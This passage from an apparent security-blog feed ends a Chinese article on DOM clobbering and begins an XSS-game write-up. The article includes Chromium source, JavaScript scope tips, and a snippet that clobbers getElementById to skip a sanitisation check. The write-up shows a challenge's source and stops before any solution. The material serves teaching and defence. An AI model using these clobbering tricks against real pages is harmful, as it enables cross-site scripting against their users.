&#x7684;&#x95EE;&#x9898;&#x5728;2&#x5E74;&#x524D;&#x4E5F;&#x6709;&#x4EBA;&#x62A5;&#x544A;&#x8FC7;&#x8FD9;&#x4E2A;&#x76F8;&#x5173;&#x7684;&#x95EE;&#x9898; <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1420032" target="_blank" rel="noopener">document.cookie DOM property can be clobbered using DOM node named cookie</a></p><p>&#x53EA;&#x4E0D;&#x8FC7;&#x76EE;&#x524D;&#x7684;&#x4E3B;&#x6D41;&#x6D4F;&#x89C8;&#x5668;&#x90FD;&#x662F;&#x201D;Safari, Chrome and Firefox all behave the same here&#x201D;&#x3002;</p><h3 id="Document-Collection"><a href="#Document-Collection" class="headerlink" title="Document Collection"></a>Document Collection</h3><p>&#x6D89;&#x53CA;&#x5230; Collection &#x7684; Document &#x90E8;&#x5206;&#xFF1A;</p><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/html/document_name_collection.cc;l=24?originalUrl=https:%2F%2Fcs.chromium.org%2F" target="_blank" rel="noopener">DocumentNameCollection::ElementMatches</a></p><figure class="highlight c++ hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">bool</span> DocumentNameCollection::ElementMatches(<span class="hljs-keyword">const</span> HTMLElement&amp; element) <span class="hljs-keyword">const</span> {</span><br><span class="line">  <span class="hljs-comment">// Match images, forms, embeds, objects and iframes by name,</span></span><br><span class="line">  <span class="hljs-comment">// object by id, and images by id but only if they have</span></span><br><span class="line">  <span class="hljs-comment">// a name attribute (this very strange rule matches IE)</span></span><br><span class="line">  <span class="hljs-keyword">auto</span>* html_embed_element = DynamicTo&lt;HTMLEmbedElement&gt;(&amp;element);</span><br><span class="line">  <span class="hljs-keyword">if</span> (IsA&lt;HTMLFormElement&gt;(element) || IsA&lt;HTMLIFrameElement&gt;(element) ||</span><br><span class="line">      (html_embed_element &amp;&amp; html_embed_element-&gt;IsExposed()))</span><br><span class="line">    <span class="hljs-keyword">return</span> element.GetNameAttribute() == name_;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">auto</span>* html_image_element = DynamicTo&lt;HTMLObjectElement&gt;(&amp;element);</span><br><span class="line">  <span class="hljs-keyword">if</span> (html_image_element &amp;&amp; html_image_element-&gt;IsExposed())</span><br><span class="line">    <span class="hljs-keyword">return</span> element.GetNameAttribute() == name_ ||</span><br><span class="line">           element.GetIdAttribute() == name_;</span><br><span class="line">  <span class="hljs-keyword">if</span> (IsA&lt;HTMLImageElement&gt;(element)) {</span><br><span class="line">    <span class="hljs-keyword">const</span> AtomicString&amp; name_value = element.GetNameAttribute();</span><br><span class="line">    <span class="hljs-keyword">return</span> name_value == name_ ||</span><br><span class="line">           (element.GetIdAttribute() == name_ &amp;&amp; !name_value.IsEmpty());</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h3 id="Window-Collection"><a href="#Window-Collection" class="headerlink" title="Window Collection"></a>Window Collection</h3><p>&#x6D89;&#x53CA;&#x5230; Collection &#x7684; Window &#x90E8;&#x5206;&#xFF1A;</p><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/html/window_name_collection.cc;l=22?originalUrl=https:%2F%2Fcs.chromium.org%2F" target="_blank" rel="noopener">WindowNameCollection::ElementMatches</a></p><figure class="highlight c++ hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">bool</span> WindowNameCollection::ElementMatches(<span class="hljs-keyword">const</span> Element&amp; element) <span class="hljs-keyword">const</span> {</span><br><span class="line">  <span class="hljs-comment">// Match only images, forms, embeds and objects by name,</span></span><br><span class="line">  <span class="hljs-comment">// but anything by id</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (IsA&lt;HTMLImageElement&gt;(element) || IsA&lt;HTMLFormElement&gt;(element) ||</span><br><span class="line">      IsA&lt;HTMLEmbedElement&gt;(element) || IsA&lt;HTMLObjectElement&gt;(element)) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (element.GetNameAttribute() == name_)</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> element.GetIdAttribute() == name_;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h2 id="Bouns"><a href="#Bouns" class="headerlink" title="Bouns"></a>Bouns</h2><h3 id="Tip-1-Global-Scope"><a href="#Tip-1-Global-Scope" class="headerlink" title="Tip 1 Global Scope"></a>Tip 1 Global Scope</h3><p>&#x7531;&#x4E8E; Dom Clobbering &#x5229;&#x7528;&#x65B9;&#x5F0F;&#x4E4B;&#x4E00;&#x5C31;&#x662F; hook &#x5168;&#x5C40;&#x4F5C;&#x7528;&#x57DF;&#x4E0B;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x53C8;&#x7531;&#x4E8E; Javascript &#x662F;&#x4E00;&#x95E8;&#x5341;&#x5206;&#x795E;&#x5947;&#x7684;&#x8BED;&#x8A00;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x5982;&#x4E0B;&#x51E0;&#x70B9;</p><h4 id="&#x663E;&#x5F0F;&#x58F0;&#x660E;"><a href="#&#x663E;&#x5F0F;&#x58F0;&#x660E;" class="headerlink" title="&#x663E;&#x5F0F;&#x58F0;&#x660E;"></a>&#x663E;&#x5F0F;&#x58F0;&#x660E;</h4><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-keyword">var</span> a = <span class="hljs-number">1</span>;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> b = <span class="hljs-number">2</span>;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-keyword">var</span> c = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">()</span> </span>{};</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">window</span>.a);<span class="hljs-comment">//1</span></span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">window</span>.b);<span class="hljs-comment">//undefined</span></span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">window</span>.c);<span class="hljs-comment">//&#x192; () {}</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="&#x9690;&#x5F0F;&#x58F0;&#x660E;"><a href="#&#x9690;&#x5F0F;&#x58F0;&#x660E;" class="headerlink" title="&#x9690;&#x5F0F;&#x58F0;&#x660E;"></a>&#x9690;&#x5F0F;&#x58F0;&#x660E;</h4><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span><span class="hljs-params">(a)</span></span>{</span></span><br><span class="line">    b = a + 1;</span><br><span class="line">  }</span><br><span class="line">  test(1);</span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">window</span>.b);<span class="hljs-comment">//2</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x4E0D;&#x5E26;&#x6709;<strong>&#x58F0;&#x660E;&#x5173;&#x952E;&#x5B57;</strong>&#x7684;&#x53D8;&#x91CF;&#xFF0C;Javascript &#x4F1A;&#x81EA;&#x52A8;&#x6302;&#x8F7D;&#x5230;&#x5168;&#x5C40;&#x4F5C;&#x7528;&#x57DF;&#x4E0A;&#x3002;</p><h4 id="let-amp-var"><a href="#let-amp-var" class="headerlink" title="let &amp; var"></a>let &amp; var</h4><p>ES6 &#x4E2D;&#x65B0;&#x589E;&#x4E86;<code>let</code>&#x547D;&#x4EE4;&#xFF0C;&#x7528;&#x6765;&#x58F0;&#x660E;&#x53D8;&#x91CF;&#x3002;&#x5B83;&#x7684;&#x7528;&#x6CD5;&#x7C7B;&#x4F3C;&#x4E8E;<code>var</code>&#xFF0C;&#x4F46;&#x662F;&#x6240;&#x58F0;&#x660E;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x53EA;&#x5728;<code>let</code>&#x547D;&#x4EE4;&#x6240;&#x5728;&#x7684;&#x4EE3;&#x7801;&#x5757;&#x5185;&#x6709;&#x6548;&#x3002;&#x8BE6;&#x7EC6;&#x53EF;&#x4EE5;&#x53C2;&#x8003; <a href="https://es6.ruanyifeng.com/#docs/let#&#x57FA;&#x672C;&#x7528;&#x6CD5;" target="_blank" rel="noopener">let &#x57FA;&#x672C;&#x7528;&#x6CD5;</a></p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">let</span> a = <span class="hljs-number">10</span>;</span><br><span class="line">  <span class="hljs-keyword">var</span> b = <span class="hljs-number">1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">a <span class="hljs-comment">// ReferenceError: a is not defined.</span></span><br><span class="line">b <span class="hljs-comment">// 1</span></span><br></pre></td></tr></table></figure><p>&#x4E0A;&#x9762;&#x4EE3;&#x7801;&#x5728;&#x4EE3;&#x7801;&#x5757;&#x4E4B;&#x4E2D;&#xFF0C;&#x5206;&#x522B;&#x7528;<code>let</code>&#x548C;<code>var</code>&#x58F0;&#x660E;&#x4E86;&#x4E24;&#x4E2A;&#x53D8;&#x91CF;&#x3002;&#x7136;&#x540E;&#x5728;&#x4EE3;&#x7801;&#x5757;&#x4E4B;&#x5916;&#x8C03;&#x7528;&#x8FD9;&#x4E24;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;&#x7ED3;&#x679C;<code>let</code>&#x58F0;&#x660E;&#x7684;&#x53D8;&#x91CF;&#x62A5;&#x9519;&#xFF0C;<code>var</code>&#x58F0;&#x660E;&#x7684;&#x53D8;&#x91CF;&#x8FD4;&#x56DE;&#x4E86;&#x6B63;&#x786E;&#x7684;&#x503C;&#x3002;&#x8FD9;&#x8868;&#x660E;&#xFF0C;<code>let</code>&#x58F0;&#x660E;&#x7684;&#x53D8;&#x91CF;&#x53EA;&#x5728;&#x5B83;&#x6240;&#x5728;&#x7684;&#x4EE3;&#x7801;&#x5757;&#x6709;&#x6548;&#x3002;</p><p>&#x800C;&#x4E14;&#x6709;&#x4E9B;&#x5F88;&#x5947;&#x5999;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> a = b = <span class="hljs-number">6</span>;</span><br><span class="line"><span class="hljs-built_in">window</span>.a;<span class="hljs-comment">//undefined</span></span><br><span class="line"><span class="hljs-built_in">window</span>.b;<span class="hljs-comment">//6</span></span><br></pre></td></tr></table></figure><h3 id="Tip-2-Overwrite-function"><a href="#Tip-2-Overwrite-function" class="headerlink" title="Tip 2 Overwrite function"></a>Tip 2 Overwrite function</h3><p>&#x867D;&#x7136;&#x53EF;&#x4EE5; Clobber &#x51FD;&#x6570;&#xFF0C;&#x4F46;&#x662F;&#x76EE;&#x524D;&#x6211;&#x6CA1;&#x627E;&#x5230;&#x4EC0;&#x4E48;&#x65B9;&#x6CD5;&#x8BA9;&#x4ED6;&#x6267;&#x884C;&#x6211;&#x4EEC; Clobber &#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x6216;&#x8005;&#x8BF4;&#x76EE;&#x524D;&#x8C8C;&#x4F3C;&#x4E5F;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x901A;&#x8FC7;&#x6807;&#x7B7E;&#x6765;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x6240;&#x4EE5;&#x53EA;&#x80FD;&#x662F;&#x5F15;&#x8D77;&#x4E00;&#x4E2A;&#x62A5;&#x9519;&#xFF0C;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&apos;getElementById&apos;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&apos;getElementById&apos;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">var</span> a = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>);<span class="hljs-comment">//Uncaught TypeError: document.getElementById is not a function</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x867D;&#x7136;&#x53EA;&#x80FD;&#x5F15;&#x8D77;&#x62A5;&#x9519;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x4E00;&#x5B9A;&#x573A;&#x666F;&#x4E0B;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x6765;&#x7ED5;&#x8FC7;&#x4E00;&#x4E9B;&#x5224;&#x65AD;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&apos;getElementById&apos;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&apos;getElementById&apos;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">var</span> a = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>);<span class="hljs-comment">//Uncaught TypeError: document.getElementById is not a function</span></span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-comment">//We must use sanitize a here.</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-comment">//We have sanitized a. We can trust a now!</span></span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-comment">//Do something with a.</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x7B2C;&#x4E00;&#x4E2A; JS &#x4EE3;&#x7801;&#x5757;&#x867D;&#x7136;&#x5F15;&#x8D77;&#x4E86;&#x62A5;&#x9519;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x4F1A;&#x5F15;&#x8D77; JS &#x5B8C;&#x5168;&#x505C;&#x6B62;&#x6267;&#x884C;&#xFF0C;JS &#x4F1A;&#x8DF3;&#x8FC7;&#x8FD9;&#x4E2A;&#x62A5;&#x9519;&#x7684;&#x4EE3;&#x7801;&#x5757;&#xFF0C;&#x6267;&#x884C;&#x4E0B;&#x4E00;&#x4E2A;&#x4EE3;&#x7801;&#x5757;&#x3002;</p><h3 id="Tip-3-Prototype-Pollution"><a href="#Tip-3-Prototype-Pollution" class="headerlink" title="Tip 3 Prototype Pollution"></a>Tip 3 Prototype Pollution</h3><p>&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#x53EF;&#x4EE5;&#x5417;&#xFF1F;</p><p>&#x6211;&#x76EE;&#x524D;&#x5C1D;&#x8BD5;&#x7684;&#x65B9;&#x6CD5;&#x8FD8;&#x6CA1;&#x6210;&#x529F;&#xFF0C;&#x5982;&#x679C;&#x5E08;&#x5085;&#x5C1D;&#x8BD5;&#x6210;&#x529F;&#x4E86;&#x4E00;&#x5B9A;&#x8981;&#x8DDF;&#x6211;&#x5206;&#x4EAB;&#xFF01;</p><h2 id="Defence"><a href="#Defence" class="headerlink" title="Defence"></a>Defence</h2><ol><li>&#x6700;&#x7B80;&#x5355;&#x7684;&#x662F;&#x5224;&#x65AD;&#x6BCF;&#x4E2A;&#x53D8;&#x91CF;&#x9884;&#x671F;&#x7684;&#x7C7B;&#x578B;&#x4EE5;&#x907F;&#x514D;&#x975E;&#x9884;&#x671F;&#x7C7B;&#x578B;&#x7684;&#x7BE1;&#x6539;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x53EF;&#x4EE5;&#x68C0;&#x67E5; Dom &#x8282;&#x70B9;&#x7684; attribute &#x5C5E;&#x6027;&#x662F;&#x5426;&#x5B9E;&#x9645;&#x4E0A;&#x662F; NamedNodeMap &#x7684;&#x5B9E;&#x4F8B;&#xFF0C;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x786E;&#x4FDD;&#x8BE5;&#x5C5E;&#x6027;&#x662F;&#x4E00;&#x4E2A; attributes &#x5C5E;&#x6027;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x653B;&#x51FB;&#x8005;&#x63D2;&#x5165;&#x7684; HTMLElement&#x3002;</li><li>&#x6BD5;&#x7ADF;&#x8FD9;&#x79CD;&#x653B;&#x51FB;&#x4E3B;&#x8981;&#x51FA;&#x73B0;&#x5728;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x8FD9;&#x4E00;&#x5757;&#xFF0C;&#x6240;&#x4EE5;&#x4EE3;&#x7801;&#x89C4;&#x8303;&#x5341;&#x5206;&#x91CD;&#x8981;&#xFF01;</li><li>&#x4F7F;&#x7528;&#x7ECF;&#x8FC7;&#x6D4B;&#x8BD5;&#x7684;&#x5E93;&#xFF0C;&#x4F8B;&#x5982; DOMPurify &#x3002;</li></ol><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Nafeez-Dom-Flow-Untangling-The-DOM-For-More-Easy-Juicy-Bugs.pdf" target="_blank" rel="noopener">DOM FLOW UNTANGLING THE DOM FOR EASY BUGS</a></p><p><a href="http://d1iv3.me/2018/04/11/DOM-Clobbering-Attack/" target="_blank" rel="noopener">DOM Clobbering Attack</a></p><p><a href="https://portswigger.net/research/dom-clobbering-strikes-back" target="_blank" rel="noopener">DOM Clobbering strikes back</a></p><p><a href="http://www.thespanner.co.uk/2013/05/16/dom-clobbering/" target="_blank" rel="noopener">DOM Clobbering</a></p><p><a href="https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94" target="_blank" rel="noopener">Clobbering the clobbered &#x2014; Advanced DOM Clobbering</a></p><p><a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/" target="_blank" rel="noopener">XSS in GMail&#x2019;s AMP4Email via DOM Clobbering</a></p><p><a href="https://wonderkun.cc/2020/02/15/DOM Clobbering Attack&#x5B66;&#x4E60;&#x8BB0;&#x5F55;" target="_blank" rel="noopener">DOM Clobbering Attack&#x5B66;&#x4E60;&#x8BB0;&#x5F55;.md</a></p><p><a href="https://cure53.de/dom" target="_blank" rel="noopener">Im DOM h&#xF6;rt Dich keiner schreien</a></p><p><a href="https://fastmail.blog/2015/12/20/sanitising-html-the-dom-clobbering-issue/" target="_blank" rel="noopener">Dec 20: Sanitising HTML &#x2013; the DOM clobbering issue</a></p><p><a href="https://juejin.im/post/5abb99e9f265da2392366824" target="_blank" rel="noopener">&#x8C08;&#x8C08; JavaScript &#x7684;&#x4F5C;&#x7528;&#x57DF;</a></p>]]></content>
        <author>
            <name><![CDATA[Zedd’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2020/02/11/xssgame/</id>
        <title><![CDATA[XSS GAME]]></title>
        <updated>2020-04-11T11:55:30+08:00</updated>
        <link href="https://blog.zeddyu.info/2020/02/11/xssgame/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2020/02/11/xssgame/"><![CDATA[<p>&#x8FC7;&#x5E74;&#x671F;&#x95F4;&#x73A9;&#x4E86;&#x4E00;&#x4E0B;&#x56FD;&#x5916;&#x7684;&#x4E00;&#x4E2A; XSS GAME&#xFF0C;&#x6536;&#x83B7;&#x9887;&#x4E30;&#xFF0C;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#x5B66;&#x4E60;&#x8FC7;&#x7A0B;&#x3002;&#x672C;&#x4EBA;&#x5BF9;&#x4E8E; JavaScript &#x4EE5;&#x53CA;&#x524D;&#x7AEF;&#x7684;&#x7406;&#x89E3;&#x4E0D;&#x6DF1;&#xFF0C;&#x6C34;&#x5E73;&#x4E5F;&#x4E0D;&#x9AD8;&#xFF0C;&#x5982;&#x679C;&#x6587;&#x7AE0;&#x6709;&#x758F;&#x6F0F;&#x4E4B;&#x5904;&#xFF0C;&#x8FD8;&#x8BF7;&#x5E08;&#x5085;&#x4EEC;&#x65A7;&#x6B63;&#x3002;</p><blockquote class="colorquote success"><p>&#x6587;&#x7AE0;&#x9996;&#x53D1;&#x4E8E;&#x5B89;&#x5168;&#x5BA2;&#xFF1A;<a href="https://www.anquanke.com/post/id/198496" target="_blank" rel="noopener">https://www.anquanke.com/post/id/198496</a></p></blockquote><a id="more"></a><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>&#x6240;&#x6709;&#x9898;&#x76EE;&#x7684;&#x76EE;&#x6807;&#x90FD;&#x662F;&#x5B9E;&#x73B0;<code>alert(1337)</code>&#x5373;&#x53EF;&#xFF0C;&#x6709;&#x7740;&#x4E0D;&#x540C;&#x7684;&#x96BE;&#x5EA6;</p><h2 id="Area-51"><a href="#Area-51" class="headerlink" title="Area 51"></a>Area 51</h2><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pwnme&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> input = (<span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;debug&apos;</span>) || <span class="hljs-string">&apos;&apos;</span>).replace(<span class="hljs-regexp">/[\!\-\/\#\&amp;\;\%]/g</span>, <span class="hljs-string">&apos;_&apos;</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> template = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&apos;template&apos;</span>);</span></span><br><span class="line">    template.innerHTML = input;</span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">    pwnme.innerHTML = &quot;<span class="hljs-comment">&lt;!-- &lt;p&gt; DE<span class="hljs-doctag">BUG:</span> &quot; + template.outerHTML + &quot; &lt;/p&gt; --&gt;</span>&quot;;</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x9898;&#x76EE;&#x6E90;&#x4EE3;&#x7801;&#x5982;&#x4E0A;&#xFF0C;&#x9898;&#x76EE;&#x4EE3;&#x7801;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x9996;&#x5148;&#x5BF9;&#x7528;&#x6237;&#x4F20;&#x5165;&#x7684; debug &#x53C2;&#x6570;&#x8FDB;&#x884C;&#x5173;&#x952E;&#x5B57;&#x8FC7;&#x6EE4;&#x8F6C;&#x6362;&#xFF0C;&#x5BF9;&#x4E8E;<code>!-/#&amp;;%</code>&#x7B26;&#x53F7;&#x90FD;&#x4F1A;&#x88AB;&#x4E0B;&#x5212;&#x7EBF;&#x66FF;&#x4EE3;&#xFF0C;&#x7136;&#x540E;&#x521B;&#x5EFA;&#x4E00;&#x4E2A; template &#x6807;&#x7B7E;&#xFF0C;&#x6807;&#x7B7E;&#x7684; HTML &#x5185;&#x5BB9;&#x4E3A;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6700;&#x540E;&#x5728;&#x4E00;&#x4E2A; div &#x4E2D;&#xFF0C;&#x628A;&#x6784;&#x5EFA;&#x597D;&#x7684; template &#x6807;&#x7B7E;&#x8F93;&#x51FA;&#x5728;&#x4E00;&#x4E2A;&#x6CE8;&#x91CA;&#x5F53;&#x4E2D;&#x3002;</p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x7684;&#x4E3B;&#x8981;&#x5F97;&#x7ED5;&#x8FC7;&#x6CE8;&#x91CA;&#x7B26;&#x7684;&#x9650;&#x5236;&#xFF0C;&#x7531;&#x4E8E;<code>&lt;!--</code>&#x662F;&#x591A;&#x884C;&#x6CE8;&#x91CA;&#xFF0C;&#x6240;&#x4EE5;&#x6362;&#x884C;&#x7684;&#x601D;&#x8DEF;&#x6211;&#x4EEC;&#x57FA;&#x672C;&#x4E0D;&#x53EF;&#x884C;&#xFF0C;&#x5373;&#x4F7F;&#x6CA1;&#x6709;&#x628A;<code>--</code>&#x8FC7;&#x6EE4;&#xFF0C;JS&#x4E5F;&#x4F1A;&#x5728;&#x7B2C;&#x4E00;&#x6B65;<code>template.innerHTML</code>&#x5C06;&#x6211;&#x4EEC;&#x7684;<code>--&gt;</code>&#x4E2D;&#x7684;<code>&gt;</code>&#x8FDB;&#x884C;&#x8F6C;&#x4E49;&#x3002;&#x6240;&#x4EE5;&#x57FA;&#x672C;&#x4E0A;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x201C;&#x76F4;&#x63A5;&#x201C;&#x95ED;&#x5408;&#x7684;&#x601D;&#x8DEF;&#x662F;&#x884C;&#x4E0D;&#x901A;&#x7684;&#x3002;</p><p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x77E5;&#x9053; HTML &#x89E3;&#x6790;&#x987A;&#x5E8F;&#xFF0C;&#x9996;&#x5148;&#x5148;&#x89E3;&#x6790; HTML &#x90E8;&#x5206;&#x4EE3;&#x7801;&#xFF0C;&#x518D;&#x7528; JS &#x89E3;&#x91CA;&#x5668; JS &#x4EE3;&#x7801;&#xFF0C;JS&#x89E3;&#x91CA;&#x5668;&#x4F1A;&#x8FB9;&#x89E3;&#x91CA;&#x8FB9;&#x6267;&#x884C;&#xFF0C;&#x5BF9;&#x4E8E; innerHTML &#x4F1A;&#x4F7F;&#x7528; HTML parser &#x89E3;&#x6790;&#x5176;&#x4E2D;&#x7684;&#x4EE3;&#x7801;&#x3002;&#x672C;&#x9898;&#x4F1A;&#x5229;&#x7528;&#x5230;&#x4E00;&#x4E9B; HTML parser &#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x5EFA;&#x8BAE;&#x914D;&#x5408; W3 &#x6587;&#x6863; <a href="https://www.w3.org/TR/html52/syntax.html" target="_blank" rel="noopener">The HTML syntax</a>&#xFF0C;&#x4E0D;&#x60F3;&#x770B;&#x82F1;&#x6587;&#x7684;&#x8BDD;&#x4E5F;&#x53EF;&#x4EE5;&#x51D1;&#x5408;&#x51D1;&#x5408;&#x770B;&#x770B;&#x672C;&#x83DC;&#x4E4B;&#x524D;&#x5199;&#x7684; <a 